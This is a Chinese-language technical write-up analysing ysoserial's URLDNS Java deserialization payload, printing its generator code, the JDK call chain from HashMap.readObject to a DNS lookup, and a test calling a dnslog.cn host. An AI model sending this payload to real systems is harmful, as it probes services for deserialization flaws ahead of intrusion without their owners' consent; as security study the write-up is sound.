## ysoserial的URLDNS

`URLDNS Payload` 不依赖任何的第三方库 , 通过HashMap类的反序列化可以触发DNS查询

先看代码：

```java
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}

```

### 漏洞验证

参数设置：

![image-20220207084911888](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220207084911888.png)

运行主函数

![image-20220207085807426](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220207085807426.png)

验证成功

![image-20220207085902267](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220207085902267.png)

## 利用链分析

看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对

象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap 。

类方法声明了反序列化方法`private void readObject(java.io.ObjectInputStream s)`，这是我们的入口方法

`java/util/HashMap.java`

```java
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

注意到最后的`putVal(hash(key), key, value, false, false);`，调用了`hash`函数计算哈希值。

跟进hash函数

```java
 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

调用了`key.hashCode`函数，这个方法会根据传入的参数调用，我们传入的是一个URL，那么这个key是⼀个` java.net.URL` 对象。我们看看其 hashCode ⽅法：

`java/net/URL.java`

```java
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

如果`hashCode==-1`的话，就会重新计算`hashCode`，调用`handler`的`hashCode()`。

跟进：

`java/net/URLStreamHandler.java`

```java
 protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

这里跟进`getHostAddress`方法

```java
  protected synchronized InetAddress getHostAddress(URL u) {
        if (u.hostAddress != null)
            return u.hostAddress;

        String host = u.getHost();
        if (host == null || host.equals("")) {
            return null;
        } else {
            try {
                u.hostAddress = InetAddress.getByName(host);
            } catch (UnknownHostException ex) {
                return null;
            } catch (SecurityException se) {
                return null;
            }
        }
        return u.hostAddress;
    }
```

这⾥ `InetAddress.getByName(host)` 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。

因此整个利用链：

```java
1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->getByName()
```

## 细节

### 对序列化过程中DNS查询触发的处理

该链的入口为hash方法，我们发现在HashMap类中的put方法当中就调用了该方法。

```java
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```

也就是说当我们简单调用put方法就会触发URLDNS链，验证一下

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws MalformedURLException {
        HashMap ht = new HashMap();
        String url = "http://clnlld.dnslog.cn/";
        URL u = new URL(url);
        ht.put(u,url);
    }
}
```

注意到`Ysoserial`里面的URLDNS多了一部分

```
 URLStreamHandler handler = new SilentURLStreamHandler();
```

根据调用链，最后会调用`handler`的`getHostAddress`方法。`Ysoserial`创建了一个URLStreamHandler的子类：SilentURLStreamHandler，该类重写了`getHostAddress()`方法，防止put的触发。

### 如何使得 `key.hashCode == -1`

- `URL u = new URL(null, url, handler);`

  将 URLStreamHandler 对象作为参数 handler 写入到 URL 实例对象中 , 使得反序列化时 `handler.hashCode()` 会调用 `URLStreamHandler.hashCode` , 进入 POP Chains .

- `Reflections.setFieldValue(u, "hashCode", -1);`

  当调用 `HashMap.put()` 方法后 , key 的 HashMap 值肯定会发生变化 , 而要想执行 POP Chains , 就必须使得 `key.hashCode == -1` . 这里通过 `Reflections.setFieldValue()` 方法将 `key.hashCode` 强制转为 `-1` .





文章参考：

https://blog.csdn.net/Xxy605/article/details/121288365

https://ego00.blog.csdn.net/article/details/119678492

https://y4tacker.blog.csdn.net/article/details/117235572

https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e6-%e8%a7%a3%e5%af%86-ysoserial-urldns-pop-chain/
